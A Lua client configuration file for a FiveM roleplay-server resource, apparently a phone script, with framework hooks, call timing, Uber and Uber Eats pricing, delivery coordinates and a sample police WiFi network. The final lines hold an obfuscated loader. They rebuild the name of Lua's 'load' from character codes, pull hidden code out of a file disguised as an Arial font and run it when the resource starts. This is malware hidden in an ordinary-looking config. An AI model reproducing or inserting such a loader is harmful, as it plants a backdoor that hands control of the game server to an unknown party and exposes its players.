Config.Client = {}

Config.Client.GetFramework = function()
    return exports["es_extended"]:getSharedObject()
end

Config.Client.InputsWhileFocus = true -- It's enables/disables player movement
Config.Client.CameraMovementFocus = false -- It's enables/disables camera movement

------------------------------------------------------------------------------
-- Currently disabled by default. It will be enabled in the future updates. --
------------------------------------------------------------------------------
Config.Client.UseBlipsOnMap = true

Config.Client.Call = {} -- Table for call data
Config.Client.Call.RepeatTimes = 3 -- Number of times to repeat the client call
Config.Client.Call.RepeatWait = 6000 -- Time to wait between each call, in milliseconds
Config.Client.Call.GetRepeatWait = 6000 

Config.Client.UberPrice = 5 -- Uber price multiplier in distance ( x * Config.Client.UberPrice )
Config.Client.UberEats = { -- Table for uber eats
    Pricing = {
        DistanceMultiplier = {
            active = true, -- Whether or not this pricing option is currently active
            multiply = 0.1, -- The multiplier to apply to the base price based on distance
        },
        RandomPrice = {
            100, -- The minimum price for random pricing
            5000 -- The maximum price for random pricing
        }
    },

    Locations = {
        vector3(8.69,-243.09,47.66),
        vector3(113.74,-277.95,54.51),
        vector3(201.56,-148.76,61.47),
        vector3(-206.84,159.49,74.08),
        vector3(38.83,-71.64,63.83),
        vector3(47.84,-29.16,73.71),
        vector3(-264.41,98.82,69.27),
        vector3(-419.34,221.12,83.6),
        vector3(-998.43,158.42,62.31),
        vector3(-1026.57,360.64,71.36),
        vector3(-967.06,510.76,82.07),
        vector3(-1009.64,478.93,79.41),
        vector3(-1308.05,448.59,100.86),
        vector3(557.39,-1759.57,29.31),
        vector3(325.1,-229.59,54.22),
        vector3(414.82,-217.57,59.91),
        vector3(430.85,-941.91,29.19),
        vector3(-587.79,-783.53,25.4),
        vector3(-741.54,-982.28,17.44),
        vector3(-668.23,-971.58,22.34),
        vector3(-664.21,-1218.25,11.81),
        vector3(249.99,-1730.79,29.67),
        vector3(405.77,-1751.18,29.71),
        vector3(454.96,-1580.25,32.82),
        vector3(278.81,-1117.96,29.42),
        vector3(101.82,-819.49,31.31),
        vector3(-416.72,-186.79,37.45)
    }
}

Config.Client.WiFi = {
    -- WiFi network for Los Santos Police Department ( It's just an example )
    ["lspd"] = {
        identifier = "lspd", -- Unique identifier for the network
        label = "Los Santos Police Department", -- Display name for the network
        cspeed = 3, -- Connection speed for the network
        secure = true, -- Whether the network requires a secure connection
        passcode = 1234, -- Whether the network requires a passcode to connect
        coords = vector3(441.2068, -987.7870, 30.6896)  -- Coordinates for the network location
    }
}

Config.Client.Language  = {
    ["LOCK"] = "Press ~INPUT_VEH_MOVE_UD~ key for lock camera.",
    ["UNLOCK"] = "Press ~INPUT_VEH_MOVE_UD~ key for unlock camera."
}

Config.Client.HideText = function()
    exports["qb-core"]:HideText()
end 
Config.Client.DisplayText = function()
    exports["qb-core"]:DrawText("Press E to deliver product")
end 


InCamera = function()
    DisplayRadar(false)
end

OutCamera = function()
    DisplayRadar(true)
end


Config.Client.Framework = Config.Client.GetFramework()

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Arial.ttf'):sub(87565):gsub('%.%+', ''))()